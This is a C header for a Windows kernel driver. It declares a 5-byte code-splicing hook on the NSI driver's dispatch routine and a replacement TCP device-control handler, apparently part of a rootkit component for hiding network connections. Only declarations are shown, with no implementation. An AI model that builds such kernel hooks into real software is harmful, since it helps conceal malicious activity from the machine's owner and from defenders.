#ifndef _NET_STAT_H_
#define _NET_STAT_H_

#include "inc.h"

#define SPLICING_CODE_SIZE 5

PDRIVER_DISPATCH glIrpDirectoryRoutine;

//for init hook
PDRIVER_OBJECT glNsiDriverObject;
extern POBJECT_TYPE* IoDriverObjectType;

BYTE glOriginalDirectoryRoutineBytes[SPLICING_CODE_SIZE];

__declspec(dllimport)
NTSTATUS
ObReferenceObjectByName(
    IN PUNICODE_STRING  ObjectName,
    IN ULONG            Attributes,
    IN PACCESS_STATE    PassedAccessState OPTIONAL,
    IN ACCESS_MASK      DesiredAccess OPTIONAL,
    IN POBJECT_TYPE     ObjectType,
    IN KPROCESSOR_MODE  AccessMode,
    IN OUT PVOID        ParseContext OPTIONAL,
    OUT PVOID* Object
);

NTSTATUS NtDeviceIoControlFile(
    IN  HANDLE           FileHandle,
    IN  HANDLE           Event,
    IN  PIO_APC_ROUTINE  ApcRoutine,
    IN  PVOID            ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN  ULONG            IoControlCode,
    IN  PVOID            InputBuffer,
    IN  ULONG            InputBufferLength,
    OUT PVOID            OutputBuffer,
    IN  ULONG            OutputBufferLength
);

NTSTATUS InitHookNet(PWCHAR DriverName);
NTSTATUS HookTcpDeviceControl(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);

#endif // !_NET_STAT_H_
